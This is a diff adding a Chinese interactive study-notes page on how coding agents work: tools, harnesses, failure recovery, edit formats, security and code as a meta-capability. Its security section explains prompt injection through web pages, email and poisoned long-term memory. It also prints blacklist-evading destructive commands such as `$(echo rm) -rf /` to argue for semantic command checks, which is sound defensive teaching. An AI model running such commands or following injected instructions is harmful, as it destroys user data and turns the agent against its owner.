@@ -1,0 +1,431 @@
+---
+title: Coding Agent：通用 Agent 的内核
+desc: 深入理解 AI Agent 学习笔记（五）：七个核心工具、Coding Agent 工作流、Harness 四象限、故障分类与恢复熔断、跨厂商接管、文件编辑方案、致命三要素与命令语义解析、代码作为元能力的六个方向。
+kicker: <span>深入理解 AI Agent · 05</span><span>对应原书第五章</span><span>约 25 分钟</span><span>边读边点</span>
+h1: 会写代码，就能<em>造出缺的工具</em>
+lead: 原书这一章的结论是：面向开放任务的通用 Agent，核心是一个 Coding Agent 加一个文件系统，从 Manus 到 OpenClaw 都是这样。代码不只是一种工具，而是能当场造出新工具、新约束、新界面的元能力。这一篇先看一个可靠的 Coding Agent 要做对哪些事，再看代码在编程之外的六种用法。
+nav: core|七个工具;harness|Harness 四象限;fail|故障与恢复;edit|搜索与编辑;sec|安全;meta|代码即规则;more|更多用法
+---
+<style>
+.quad { display: grid; grid-template-columns: 7em minmax(0, 1fr) minmax(0, 1fr); gap: 6px; }
+.quad .hd { font-size: 15px; color: var(--ink-3); font-weight: 600; display: flex; align-items: center; justify-content: center; text-align: center; }
+.quad .cell { border: 1px dashed var(--rule); border-radius: 8px; min-height: 92px; padding: 8px; }
+.quad .cell h5 { margin: 0 0 6px; font-size: 15px; font-weight: 650; }
+.quad .cell.best { border-color: var(--ok); background: color-mix(in srgb, var(--ok-soft) 60%, transparent); }
+.quad .cell button { margin: 0 6px 6px 0; }
+.ladder2 { list-style: none; margin: 8px 0 0; padding: 0; }
+.ladder2 li { display: grid; grid-template-columns: 2.4em minmax(0, 1fr); gap: 10px; align-items: start; padding: 10px; border: 1px solid var(--hair); border-radius: 8px; margin-bottom: 6px; background: var(--bg); opacity: .4; transition: opacity .25s; }
+.ladder2 li.on { opacity: 1; border-color: var(--s1); }
+.ladder2 li.end { opacity: 1; border-color: var(--alert); }
+.ladder2 i { font-style: normal; font-family: var(--f-num); font-weight: 700; color: var(--s1); }
+.ladder2 b { display: block; font-size: 16px; }
+.ladder2 span { font-size: 15px; color: var(--ink-2); }
+.tri { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 8px; }
+.tri label { display: flex; gap: 8px; align-items: flex-start; border: 1px solid var(--hair); border-radius: 8px; padding: 10px; background: var(--bg); font-size: 15px; cursor: pointer; }
+.tri label b { display: block; font-size: 16px; }
+.tri input { accent-color: var(--alert); width: 18px; height: 18px; margin-top: 2px; }
+@media (max-width: 560px) { .tri { grid-template-columns: minmax(0, 1fr); } }
+.riskbar { height: 14px; border-radius: 7px; background: var(--dim-soft); overflow: hidden; margin: 10px 0 4px; }
+.riskbar span { display: block; height: 100%; background: var(--alert); transition: width .3s; }
+.db { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); gap: 14px; }
+.db h5 { margin: 0 0 6px; font-size: 15px; color: var(--ink-3); font-weight: 600; }
+.db label { display: flex; justify-content: space-between; gap: 8px; font-size: 15px; padding: 5px 0; border-top: 1px solid var(--hair); align-items: center; }
+.db select { font: inherit; font-size: 15px; padding: 2px 6px; border: 1px solid var(--rule); border-radius: 6px; background: var(--bg); color: var(--ink); }
+@media (max-width: 640px) { .db { grid-template-columns: minmax(0, 1fr); } .quad { grid-template-columns: 4.5em minmax(0, 1fr) minmax(0, 1fr); } }
+.out2 { font-family: var(--f-num); font-size: 15px; background: var(--bg); border: 1px solid var(--hair); border-radius: 6px; padding: 10px 12px; white-space: pre-wrap; margin-top: 10px; }
+</style>
+===BODY===
+<section class="part" id="core">
+  <div class="part-head"><h2>七个工具，就是一个 Coding Agent</h2><span class="meta">原书 5.1 节</span></div>
+  <div class="sec-lede">
+    <p>原书认为，<strong>代码生成不是少数专门化 Agent 的专利，而是每个通用 Agent 都该具备的基础能力</strong>，而且不需要复杂架构。浏览目录、读代码、改文件、跑命令、查模式，这五类动作只需七个核心工具：代码解释器、Bash、读文件、写文件、编辑文件、按文件名搜索（Glob）、按内容搜索（Grep）。其实一个 Bash 就能覆盖大部分，OpenAI Codex 就只用 shell 加一个语法受约束的 <code>apply_patch</code>；原书列七个是为了把能力讲清楚。</p>
+    <p>为什么 Coding 是 Manus、OpenClaw 这类通用 Agent 的核心，而不是 Deep Research 或 Computer Use？因为几乎所有高效的内容生成最终都落在代码上：PPT 和 Word 本质是 OOXML，报告可以由 Markdown、HTML、LaTeX 生成，GUI 上成功的操作序列也可以固化成代码。Computer Use 更通用，但成本、延迟、稳定性远不如直接写代码调 API。</p>
+    <p><strong>文件系统是中枢</strong>：OpenClaw 把长期记忆放在 <code>MEMORY.md</code> 和按日期归档的 Markdown 日志里，用户可以直接打开改，天然保留时间顺序，还能用 Git 回滚。原书也划了边界：这个判断主要适用于面向开放任务的 Agent；垂直客服这类封闭任务的 Agent，代码更多是工具箱里的一件工具。</p>
+    <p class="go">给每个动作挑一个工具。</p>
+  </div>
+  <div class="lab"><div id="toolSort"></div></div>
+  <div class="notes" id="n-core"></div>
+</section>
+
+<section class="part" id="harness">
+  <div class="part-head"><h2>为什么 Coding Agent 最成熟</h2><span class="meta">原书 5.1 节 · 整体流程与 Harness</span></div>
+  <div class="sec-lede">
+    <p>原书推荐的工作流程像一个靠谱的新工程师：先<strong>项目文档化</strong>（没有文档就先读代码、写出架构概览和测试指南；CLAUDE.md、AGENTS.md 这类项目指令文件就是面向 Agent 的项目级系统提示词，也是最经济的稳定前缀）；复杂需求先<strong>澄清</strong>；写<strong>设计文档</strong>给人审，审设计比审几百行代码容易得多；实现后<strong>测试—修复</strong>循环到全部通过，再自审；最后<strong>同步文档</strong>。Coding Agent 最常见的偷懒，就是不跑测试就报告完成，所以完成标准应该是“测试通过”而不是“代码写完”。</p>
+    <p>原书用两个维度给任务分四个象限：<strong>目标是否明确 × 结果能否自动验证</strong>。两者都满足是 Agent 的最佳区域；目标明确但要人验，吞吐量被人的审查速度卡住；能自动验证但目标模糊，会高效地跑偏；两者都缺，基本派不上用场。代码天然处在最佳象限：测试给出验收标准，linter 和类型检查即时反馈，Git 提供回退。所以 <strong>Coding Agent 成熟，不是因为代码模型特别强，而是软件工程几十年攒下的基础设施天然就是一套强大的 Harness</strong>。</p>
+    <p>由此得出可迁移的四条原则：<strong>约束优先于指导</strong>（能用 linter、CI 强制的就别写成“请遵循”）；<strong>验证要自动化</strong>；<strong>反馈越快越结构化越好</strong>；<strong>回退要可靠</strong>。约束还要管<strong>过程</strong>：把库删了重建也算“修好了数据库”，把代码全删也能“编译通过”，所以危险动作本身要被检查。</p>
+    <p class="go">把下面的任务放进四个象限。</p>
+  </div>
+  <div class="lab">
+    <p class="lab-t">任务清晰度 × 验证自动化</p>
+    <div class="ctrls" id="qPool"></div>
+    <div class="quad" id="quad"></div>
+    <p class="cap" id="qCap">先点上面一个任务，再点它所在的格子。</p>
+  </div>
+  <div class="notes" id="n-harness"></div>
+</section>
+
+<section class="part" id="fail">
+  <div class="part-head"><h2>故障：先分类，再恢复，最后要有上限</h2><span class="meta">原书 5.1 节 · 故障与错误恢复</span></div>
+  <div class="sec-lede">
+    <p>原书基于对 Claude Code 等生产级实现的研究，把故障分成四层：<strong>API 层</strong>（限流、过载、超时、输出被截断）、<strong>工具层</strong>（幻觉调用、参数畸形、同一个错误反复出现模型却原样重试）、<strong>上下文层</strong>（窗口溢出、压缩失败、工具调用缺少配对结果）、<strong>控制流层</strong>（死循环和死亡螺旋）。</p>
+    <p>捕获错误后先问“<strong>值不值得重试</strong>”：限流、网络抖动值得；参数非法、权限不足、工具不存在，重试多少次都一样。再检测模式：对“工具名 + 参数”算指纹，相同指纹反复出现就是无进展循环。恢复按对用户透明的程度分级：<strong>静默重试</strong>（指数退避加随机抖动；后台辅助调用失败直接放弃，免得挤占主链路）→ <strong>降级与接续</strong>（输出触顶就提高上限或让模型从断点续写；主模型过载就换备用模型）→ 都失败了才<strong>暴露给用户</strong>。工具层错误则不终止会话，变成结构化的工具结果交给模型下一轮自己改。</p>
+    <p>每条恢复路径都要有<strong>熔断上限</strong>，阈值来自生产数据：Claude Code 的压缩熔断是“连续 3 次”，因为曾有一个会话在这条路径上连续失败三千多次，这类无效重试每天在全球浪费约 25 万次 API 调用。更隐蔽的是<strong>死亡螺旋</strong>：错误处理逻辑本身又调用 LLM，又出错。还有跨厂商接管：思考里的文字可以带给另一家，厂商签发的凭证带不走，所以轨迹应存成<strong>中立格式</strong>。</p>
+    <p class="go">选一种故障，看它沿恢复阶梯走到哪一级；再按步骤看一次真实发生过的死亡螺旋。</p>
+  </div>
+  <div class="lab-row">
+    <div class="lab">
+      <p class="lab-t">恢复阶梯</p>
+      <div class="seg" id="fSeg"><button data-v="0" aria-pressed="true">HTTP 429 限流</button><button data-v="1">输出写到一半被截断</button><button data-v="2">调用了不存在的工具</button><button data-v="3">主模型持续过载</button><button data-v="4">同一调用第 5 次失败</button></div>
+      <ul class="ladder2" id="fLad"></ul>
+      <p class="cap" id="fCap"></p>
+    </div>
+    <div class="lab">
+      <p class="lab-t">一次死亡螺旋</p>
+      <div class="chat" id="dsChat"></div>
+      <div id="dsStep"></div>
+    </div>
+  </div>
+  <div class="notes" id="n-fail"></div>
+</section>
+
+<section class="part" id="edit">
+  <div class="part-head"><h2>怎么找代码，怎么改代码</h2><span class="meta">原书 5.1 节 · 实现技巧、搜索与编辑</span></div>
+  <div class="sec-lede">
+    <p>几个实现技巧：<strong>流式执行</strong>（第一个工具调用的参数一生成完、通过校验就开始执行，不等后面的调用）；并行调用失败时<strong>级联中止</strong>只波及同批次中依赖它的调用；读文件<strong>带行号</strong>，模型可以精确引用“第 42 行”；Git 分支、未暂存变更等环境信息作为<strong>状态栏</strong>追加，而不是写死在系统提示词里；维护一个<strong>持久终端会话</strong>，<code>cd</code> 和激活虚拟环境的效果能保留；写完文件立刻跑 linter，像 IDE 画红线。</p>
+    <p>搜索有四种：grep 按内容匹配，glob 按文件名匹配，语义代码搜索按意义找，符号搜索区分定义和调用。有一场路线之争：Claude Code 刻意<strong>不建嵌入索引</strong>，纯靠 grep + glob 现场检索，省掉随代码演化而陈旧的索引；Cursor 早期建索引做语义召回，现在也改用 grep + glob 了。</p>
+    <p>编辑的难点是让模型可靠地说清“改哪里、怎么改”。原书比较了五种方案：<strong>差异描述 + Apply Model</strong>（Cursor 曾用，合并环节脆弱）、<strong>旧字符串 → 新字符串</strong>（Claude Code、Codex 和现在的 Cursor 采用，可预测，但删大段代码要原样输出全部原文）、<strong>行号定位</strong>（精确，但每次编辑后行号会变）、<strong>类 Vim 命令</strong>（为“边看边改”的人设计，不适合“想很久再批量改”的模型）、<strong>首尾匹配</strong>（只给要删内容的开头几行和结尾几行，兼顾可靠和省 token）。</p>
+    <p class="go">选一种编辑场景，看五种方案各自的代价。</p>
+  </div>
+  <div class="lab">
+    <p class="lab-t">五种编辑方案</p>
+    <div class="seg" id="edSeg"><button data-v="0" aria-pressed="true">删掉一个 200 行的函数</button><button data-v="1">改一行，但这行在文件里出现了三次</button><button data-v="2">一次思考里改五处</button><button data-v="3">把一个函数挪到文件末尾</button></div>
+    <div class="tblw" style="margin-top:12px"><table class="cmpt"><thead><tr><th>方案</th><th>这个场景下</th></tr></thead><tbody id="edT"></tbody></table></div>
+  </div>
+  <div class="notes" id="n-edit"></div>
+</section>
+
+<section class="part" id="sec">
+  <div class="part-head"><h2>致命三要素，再加一个放大器</h2><span class="meta">原书 5.1 节 · Coding Agent 的安全</span></div>
+  <div class="sec-lede">
+    <p>Simon Willison 的<strong>致命三要素</strong>：Agent 能<strong>访问私有数据</strong>，会<strong>暴露于不受信任的内容</strong>，又<strong>具备外部通信能力</strong>。三者齐备，攻击路径就闭合了：恶意指令藏在网页或邮件里进来，驱使 Agent 读私有数据，再经对外通道送出去。原书补充第四个维度<strong>持久记忆</strong>，它不是必要条件，而是放大器：攻击者把恶意指令写进长期记忆，跨会话潜伏，一次性攻击变成长期威胁。OpenClaw 这样的全权限本地 Agent 四者兼备。</p>
+    <p>原书的思路是：<strong>单靠输入过滤挡不住，重点是让 Agent 即使被注入，也没机会把危险动作执行出去</strong>。沙盒默认断网、白名单代理放行，这正好切断第三要素；源码只读挂载、凭证文件根本不挂进沙盒；超时超限返回结构化错误而不是静默杀进程。命令检查要做<strong>语义解析</strong>而不是关键字黑名单：<code>$(echo rm) -rf /</code> 能绕过黑名单，<code>find … -exec rm</code> 把删除藏在合法命令的参数里。</p>
+    <p>还有一类更微妙的问题：<strong>Agent 为谁效忠</strong>。模型默认“谁在跟我说话就帮谁”，可替你砍价的 Agent 对面坐的是交涉对手。实测两端都会翻车：太老实会把底价抖出去，太多疑连主人的正当请求也拒绝。提示注入本质上就是一次策反，Harness 要把主人指令定为最高优先级，外部内容一律降格为“可参考的数据”。</p>
+    <p class="go">勾选你的 Agent 具备哪些要素；再用黑名单和语义解析各查一遍几条命令。</p>
+  </div>
+  <div class="lab-row">
+    <div class="lab">
+      <p class="lab-t">你的 Agent 有几个要素</p>
+      <div class="tri" id="tri"></div>
+      <div class="riskbar"><span id="triBar"></span></div>
+      <p class="cap" id="triCap"></p>
+    </div>
+    <div class="lab">
+      <p class="lab-t">黑名单 vs 语义解析</p>
+      <p class="lab-s">黑名单只拦以 <code>rm</code> 开头的命令。</p>
+      <div class="tblw"><table class="cmpt"><thead><tr><th>命令</th><th>黑名单</th><th>语义解析</th></tr></thead><tbody id="cmdT"></tbody></table></div>
+      <p class="cap" id="cmdCap">点任一行看解释。</p>
+    </div>
+  </div>
+  <div class="notes" id="n-sec"></div>
+</section>
+
+<section class="part" id="meta">
+  <div class="part-head"><h2>代码即规则：checklist 引导，真值守门</h2><span class="meta">原书 5.2 节 · 思考工具与业务规则约束</span></div>
+  <div class="sec-lede">
+    <p><strong>元能力</strong>是“能创造其他能力的能力”。原书按作用对象由内向外列了六个方向：思维本身、业务规则、内容呈现、系统接口、用户界面、Agent 自身。最内一层是<strong>思考工具</strong>：40 人的班，60% 选数学、45% 选物理、25% 两门都选，只选物理的有几人？自然语言推理容易从数学人数里减（得 14），代码直接算出 18 − 10 = 8。让 LLM 负责理解并写代码，让解释器或符号计算引擎负责算。原书也提醒：模型越强，这层脚手架的增益越小；评估一项 Agent 技术时，结论取决于配的是什么模型。</p>
+    <p>第二层是<strong>业务规则</strong>。“购买后 7 天内可退款”，是自然日还是工作日？从下单还是发货算？代码没有歧义。原书以 τ-bench 航空取消政策为例，给出一个三重保障的设计：系统提示词里的自然语言规则用于理解和解释；工具描述列出全部政策，并用可选的 <code>expected_cabin_class</code>、<code>expected_has_insurance</code> 参数让模型<strong>把判断依据写出来</strong>，填参数的过程就是一张强制 checklist，模型常常在准备调用时就发现不能取消，直接给用户提替代方案；最后，<strong>服务端只按数据库真值裁决</strong>，舱位、保险、预订时间、当前时间一律查库和取服务端时钟，绝不采信模型自报，自报与真值不符时记日志。</p>
+    <p>关键在于：最后一道防线必须建在模型无法伪造的数据上。独立性不仅指独立的模型，更指独立的数据来源。</p>
+    <p class="go">设定数据库里的订单事实和模型自报的参数，调用一次取消。</p>
+  </div>
+  <div class="lab">
+    <p class="lab-t">cancel_reservation：真值校验</p>
+    <div class="db">
+      <div><h5>数据库真值（服务端读取）</h5><div id="dbTruth"></div></div>
+      <div><h5>模型自报（expected_* 参数，仅供比对）</h5><div id="dbClaim"></div></div>
+    </div>
+    <div class="ctrls"><button class="btn pri" type="button" id="dbGo">调用 cancel_reservation</button></div>
+    <div class="out2" id="dbOut">（还没调用）</div>
+  </div>
+  <div class="notes" id="n-meta"></div>
+</section>
+
+<section class="part" id="more">
+  <div class="part-head"><h2>代码的另外四种用法</h2><span class="meta">原书 5.2 节</span></div>
+  <div class="sec-lede">
+    <p><strong>多媒体生成</strong>：PPT 用 Slidev 的 Markdown 写，视频用 Blender Python API 和 FFmpeg 剪。Agent 写完代码并不知道渲染效果，所以用提议者—审核者：Reviewer 渲染截图、用视觉模型给出“第 3 页内容过多建议拆分”这类结构化意见，迭代到达标或到 5 轮上限。双 Agent 的好处在上下文：Reviewer 每次只看最新渲染图，Proposer 只累积文字反馈。<strong>代码还是生成模型？</strong>看产物有没有紧凑的精确描述：法兰盘五六个参数就能定义，代码是无损表达，改孔径只改一个数；一盆绿植细节近乎无限，交给生成模型。</p>
+    <p><strong>系统适配器</strong>：没有 SDK 的接口，现场读文档写胶水代码；日志格式变了，前端解析失败就把样本交给 Agent 生成新解析代码，测试通过后热更新。<strong>生成式 UI</strong>：用一张级联表单代替十轮澄清问答；A2UI 这类声明式协议只让 Agent 从受信任组件目录里点菜，而不是直接生成可执行代码。查数据库用 <strong>Artifact 模式</strong>：Agent 只写 SQL，数据从数据库直达界面，LLM 不去“抄写”几千行；执行层仍要只读账号、只放行 SELECT、参数化绑定。动态生成软件时，<strong>把信任边界下移到数据层</strong>，即使 AI 写漏了权限判断，越权也会被数据库拒绝。</p>
+    <p><strong>Agent 自举</strong>：OpenClaw 的 <code>doctor</code> 先用确定性检查修掉过期 token、锁文件、端口冲突这类高频问题，再把长尾疑难交给 LLM。让 Agent 写 Agent 时，最有效的办法不是在提示词里穷尽规则，而是<strong>给一个高质量的 Agent 实现当范例</strong>，复制后针对性修改。</p>
+    <p class="go">用几道题检验这些判断。</p>
+  </div>
+  <div class="lab"><div id="moreQ"></div></div>
+  <div class="notes" id="n-more"></div>
+</section>
+===SCRIPT===
+/* ---------- 1 七工具 ---------- */
+S.sortGame($('#toolSort'), {
+  bins: [{ k: 'ci', t: 'Code Interpreter' }, { k: 'sh', t: 'Bash' }, { k: 'rd', t: 'Read' }, { k: 'wr', t: 'Write' }, { k: 'ed', t: 'Edit' }, { k: 'gl', t: 'Glob' }, { k: 'gr', t: 'Grep' }],
+  items: [
+    { t: '找出项目里所有 Python 文件', k: 'gl', why: '按文件名模式 **/*.py 匹配，不需要打开文件。' },
+    { t: '找出所有调用 handle_payment 的代码行', k: 'gr', why: '在文件内容里搜索文本模式。' },
+    { t: '看 config.yaml 写了什么', k: 'rd', why: '读取文件内容，最好带行号。' },
+    { t: '把第 42 行的超时从 30 改成 60', k: 'ed', why: '对现有文件做局部修改。' },
+    { t: '新建 TODO_LIST.md', k: 'wr', why: '创建新文件或完整重写。' },
+    { t: '运行 pytest', k: 'sh', why: '在终端里执行命令。' },
+    { t: '统计每个模块的 TODO 数并画柱状图', k: 'ci', why: '在沙盒里跑 Python 做统计和绘图。' }
+  ]
+});
+S.notes($('#n-core'), {
+  c: [
+    ['Coding Agent', '能自主编写、修改和执行代码的 Agent。'],
+    ['七个核心工具', '代码解释器、Bash、读、写、编辑、Glob、Grep。'],
+    ['apply_patch', 'Codex 的语法受约束的补丁工具，把编辑表达为结构化补丁。'],
+    ['MEMORY.md', 'OpenClaw 存长期记忆的 Markdown 文件；SOUL.md 定义身份与行为规则。']
+  ],
+  p: [
+    ['通用 Agent = Coding Agent + 文件系统', '适用于面向开放任务的 Agent；封闭的垂直 Agent 里代码只是一件工具。'],
+    ['为什么是 Coding 而不是 Computer Use', '内容生成最终落到代码；Computer Use 通用但成本、延迟、稳定性都差。'],
+    ['文件系统是中枢', '记忆从文件读，产物写进文件，经验也存成文件；Markdown 可读可改可回滚。']
+  ]
+});
+
+/* ---------- 2 四象限 ---------- */
+var qItems = [
+  { t: '修复一个有测试用例的 bug', c: 'cl-auto', why: '目标明确、测试能自动验证：最佳区域。' },
+  { t: '重构核心模块，需要人审', c: 'cl-man', why: '目标清楚，但验收靠人盯，吞吐量被审查速度卡住。' },
+  { t: '让 linter 把“代码质量”打到满分', c: 'fz-auto', why: '有自动反馈，但“代码质量”这个目标模糊，系统会高效地往错误方向跑。' },
+  { t: '让 UI 更好看', c: 'fz-man', why: '目标模糊、验收靠人，基本难以启动。' },
+  { t: '把 API 响应时间降到 200ms 以下（有压测脚本）', c: 'cl-auto', why: '目标量化、压测能自动验证。' },
+  { t: '优化系统性能（没说优化什么）', c: 'fz-man', why: '原书例子：先要澄清是延迟、内存还是吞吐，可接受的权衡是什么。' }
+];
+var cells = [['cl-auto', '目标明确 · 可自动验证', '最佳区域'], ['cl-man', '目标明确 · 需人工验证', '吞吐量受限'], ['fz-auto', '目标模糊 · 可自动验证', '高效地跑偏'], ['fz-man', '目标模糊 · 需人工验证', '难以启动']];
+var qd = $('#quad'), qPick = null;
+h('div', { class: 'hd' }, qd); h('div', { class: 'hd', text: '结果可自动验证' }, qd); h('div', { class: 'hd', text: '结果需人工验证' }, qd);
+var cellEls = {};
+[['目标明确', 0, 1], ['目标模糊', 2, 3]].forEach(function (row) {
+  h('div', { class: 'hd', text: row[0] }, qd);
+  [row[1], row[2]].forEach(function (ci) {
+    var c = cells[ci], d = h('div', { class: 'cell' + (ci === 0 ? ' best' : '') }, qd);
+    h('h5', { text: c[2] }, d);
+    cellEls[c[0]] = d;
+    d.addEventListener('click', function () {
+      if (!qPick) return;
+      var ok = qPick.it.c === c[0];
+      qPick.b.remove();
+      h('span', { class: 'chip2 ' + (ok ? 'ok' : 'bad'), text: qPick.it.t, style: 'display:inline-block;margin:0 6px 6px 0' }, cellEls[qPick.it.c]);
+      $('#qCap').innerHTML = (ok ? '<b>对。</b>' : '<b style="color:var(--alert)">不对。</b>') + qPick.it.why;
+      qPick = null;
+    });
+  });
+});
+qItems.forEach(function (it) {
+  var b = h('button', { class: 'chip2', type: 'button', text: it.t }, $('#qPool'));
+  b.addEventListener('click', function () { S.$$('.chip2', $('#qPool')).forEach(function (x) { x.setAttribute('aria-pressed', 'false'); }); b.setAttribute('aria-pressed', 'true'); qPick = { b: b, it: it }; $('#qCap').textContent = '已选：' + it.t + '。点它所在的格子。'; });
+});
+S.notes($('#n-harness'), {
+  c: [
+    ['项目指令文件', 'CLAUDE.md、AGENTS.md 等，会话开始自动注入，是项目级系统提示词和最经济的稳定前缀。'],
+    ['验收基线', '什么算做完：测试套件、CI、代码审查标准。'],
+    ['执行边界', 'Agent 能碰什么：模块边界、依赖规则、权限控制。'],
+    ['反馈信号 / 回退手段', 'linter、测试、类型检查；Git、沙盒、快照。'],
+    ['AI-ready 指标', '一个远程新人只靠代码仓库和文档，能不能独立开展工作。']
+  ],
+  p: [
+    ['推荐流程', '文档化 → 澄清 → 设计文档（给人审）→ 实现 → 测试修复 → 自审 → 同步文档。'],
+    ['完成标准', '“测试通过”，而不是“代码写完”。'],
+    ['四象限', '目标是否明确 × 能否自动验证；Harness 的目标是把任务推向“明确 + 可自动验证”。'],
+    ['四条可迁移原则', '约束优先于指导；验证自动化；反馈快而结构化；回退可靠。'],
+    ['约束也要管过程', '删库重建、全删重写这类破坏性捷径要单独检查（第 8 篇 RLVP 从训练侧解决）。']
+  ]
+});
+
+/* ---------- 3 故障 ---------- */
+var steps = [['静默重试', '指数退避 + 随机抖动，尊重服务端的等待提示；后台辅助调用失败直接放弃。'], ['降级与接续', '改变请求本身：提高输出上限、从断点续写、换备用模型、回落标准模式。'], ['作为工具结果交给模型', '不终止会话，结构化错误进入上下文，模型下一轮自己改。'], ['暴露给用户', '所有自动手段用尽，附上已尝试过的恢复动作。'], ['熔断 / 升级人工', '连续失败达到阈值，停止这条恢复路径。']];
+var fCases = [
+  { on: [0], cap: '可重试的基础设施噪声。重试成功，用户毫无感知：在确认无法恢复之前不暴露中间错误。' },
+  { on: [1], cap: '先静默提升输出上限重发；还不够，就在末尾追加元指令让模型从断点接着写。' },
+  { on: [2], cap: '幻觉调用不可重试，原样重发没用。返回“工具不存在”的结构化错误，模型下一轮改正。' },
+  { on: [0, 1], cap: '重试无效后降级到备用模型。注意先剥离旧模型私有的格式块，否则新模型解析不了历史消息。' },
+  { on: [0, 2, 4], end: true, cap: '“工具名 + 参数”指纹重复出现，是无进展循环。连续失败计数达到上限就熔断，转人工判断。Claude Code 的压缩熔断阈值是连续 3 次，来自生产数据。' }
+];
+function drawF(i) {
+  var c = fCases[+i], ul = $('#fLad'); ul.innerHTML = '';
+  steps.forEach(function (s, j) {
+    var cls = c.on.indexOf(j) >= 0 ? (j === 4 ? 'end' : 'on') : '';
+    var li = h('li', { class: cls }, ul); h('i', { text: j + 1 }, li); h('div', { html: '<b>' + s[0] + '</b><span>' + s[1] + '</span>' }, li);
+  });
+  $('#fCap').textContent = c.cap;
+}
+S.seg($('#fSeg'), drawF); drawF(0);
+var ds = [
+  { r: 'sys', b: '上下文溢出', t: 'Agent 因上下文溢出停止。' },
+  { r: 'tool', b: '停止钩子', t: '触发“结束时自动提交代码”的钩子，钩子调用 LLM 生成 commit message。' },
+  { r: 'sys', b: '又溢出', t: '生成 commit message 的请求也带着超长上下文，再次溢出。' },
+  { r: 'tool', b: '又触发钩子', t: '再次停止 → 再次触发钩子 → 再次调用 LLM ……' },
+  { r: 'asst', b: '防护', t: '① 错误路径上禁用一切会再次调用模型的副作用逻辑（宁可丢掉一次自动提交或记忆提取）；② 递归深度计数器打断残余连锁；③ 全局兜底：最大轮数、会话预算、连续失败升级人工。' }
+];
+S.stepper($('#dsStep'), ds.length, function (i) { var c = $('#dsChat'); c.innerHTML = ''; for (var j = 0; j <= i; j++) S.msg(c, ds[j], j === i); });
+S.notes($('#n-fail'), {
+  c: [
+    ['四层故障', 'API 层、工具层、上下文层、控制流层。'],
+    ['调用指纹', '“工具名 + 参数”的指纹，反复出现即无进展循环。'],
+    ['空闲看门狗', '流式连接超过设定时间没有新输出就判定卡死，主动杀掉重试。'],
+    ['死亡螺旋', '错误处理逻辑自己又调用 LLM、又出错，形成连锁。'],
+    ['中立轨迹格式', '思考拆成可移植的文字和不可移植的凭证，工具调用只记名称和参数。']
+  ],
+  p: [
+    ['先分类：值不值得重试', '限流、过载可重试；参数非法、权限不足、工具不存在必须改输入或策略。'],
+    ['恢复分级', '静默重试 → 降级与接续 → 暴露给用户；工具层错误变成模型的输入。'],
+    ['不暴露中间态', '错误处理的边界是整个恢复循环，不是单次请求。'],
+    ['熔断阈值来自数据', 'Claude Code 压缩熔断 = 连续 3 次；曾有会话连续失败 3000+ 次，每天浪费约 25 万次调用。'],
+    ['跨厂商接管', '带走文字，带不走凭证；按最严格的厂商设计，必要时把历史调用改写成文字叙述。'],
+    ['产品宽容，训练严格', '产品模式可用占位符修补缺失消息，训练数据收集模式拒绝修补。']
+  ]
+});
+
+/* ---------- 4 编辑 ---------- */
+var meth = ['差异描述 + Apply Model', '旧字符串 → 新字符串', '行号定位', '类 Vim 命令', '首尾匹配'];
+var edc = [
+  ['合并时要在长文件里找对位置，相似代码多时可能合到错误的地方。', '要把 200 行原文一字不差地输出，一个字符偏差就匹配失败，费 token。', '只给首尾两个行号，最省。', '可以，但较小的模型命令出错率高。', '只给开头几行和结尾几行，中间省略；仍按内容匹配，可靠又省。'],
+  ['Apply 模型可能合并到错误的那一处。', '原文不唯一就失败，需要带上更长的上下文来消歧，这种失败是明确的而不是模糊的。', '行号精确，不存在歧义。', '可以按行跳转。', '首尾要选得足够长，保证组合唯一。'],
+  ['一次给出多处变更描述即可。', '每处各自匹配，互不影响。', '每次编辑后后面的行号都会变，要求模型在多处编辑中统一用初始行号。', '最不友好：每条命令执行后文件和行号都变了，模型很难提前算好。', '每处各自匹配，互不影响。'],
+  ['可以描述，但合并依赖 Apply 模型。', '先删再加，原文要完整输出两遍。', '先删再插，注意行号偏移。', '最顺手：剪切、粘贴正是 Vim 的强项。', '删除时省 token，插入新位置仍要写出全文。']
+];
+function drawEd(i) {
+  $('#edT').innerHTML = meth.map(function (m, j) { return '<tr><td>' + m + '</td><td>' + edc[+i][j] + '</td></tr>'; }).join('');
+}
+S.seg($('#edSeg'), drawEd); drawEd(0);
+S.notes($('#n-edit'), {
+  c: [
+    ['流式执行', '工具调用参数一生成完、通过校验就开始执行，不等后续调用。'],
+    ['级联中止', '并行调用失败时只中止同批次中依赖它的调用，不波及独立调用和父操作。'],
+    ['持久终端会话', '在同一个 shell 里执行命令，保留目录、环境变量、虚拟环境。'],
+    ['语义代码搜索', '按函数/类结构分块，向量 + 关键词混合检索再重排序。'],
+    ['符号搜索', '区分定义和引用，像 IDE 的跳转到定义；主流 Coding Agent 目前未采用。']
+  ],
+  p: [
+    ['五个实现技巧', '并行与流式、精细上下文管理、环境感知状态栏、状态持久化、即时语法反馈。'],
+    ['读文件带行号', '模型可以精确引用和编辑。'],
+    ['不建索引的路线', 'Claude Code 纯靠 grep + glob；Cursor 后来也改用现场检索。'],
+    ['主流编辑方案', '旧字符串 → 新字符串（Claude Code、Codex、Cursor）：存在且唯一才成功。'],
+    ['Vim 为人设计', '人边看边做小操作；模型是想很久再批量做大操作。']
+  ]
+});
+
+/* ---------- 5 安全 ---------- */
+var tri = [
+  ['priv', '访问私有数据', '能读用户文件、密码管理器'],
+  ['untr', '暴露于不受信任内容', '要处理邮件、网页'],
+  ['out', '外部通信能力', '能发邮件、联网、执行命令'],
+  ['mem', '持久记忆（放大器）', '写入长期记忆的内容跨会话生效']
+];
+var triOn = { priv: true, untr: true, out: true, mem: false };
+tri.forEach(function (t) {
+  var l = h('label', null, $('#tri'));
+  var cb = h('input', { type: 'checkbox' }, l); cb.checked = triOn[t[0]];
+  h('span', { html: '<b>' + t[1] + '</b>' + t[2] }, l);
+  cb.addEventListener('change', function () { triOn[t[0]] = cb.checked; drawTri(); });
+});
+function drawTri() {
+  var core = ['priv', 'untr', 'out'].filter(function (k) { return triOn[k]; }).length;
+  var w = core === 3 ? (triOn.mem ? 100 : 80) : core * 20 + (triOn.mem ? 5 : 0);
+  $('#triBar').style.width = w + '%';
+  var missing = ['priv', 'untr', 'out'].filter(function (k) { return !triOn[k]; }).map(function (k) { return tri.filter(function (t) { return t[0] === k; })[0][1]; });
+  $('#triCap').innerHTML = core === 3
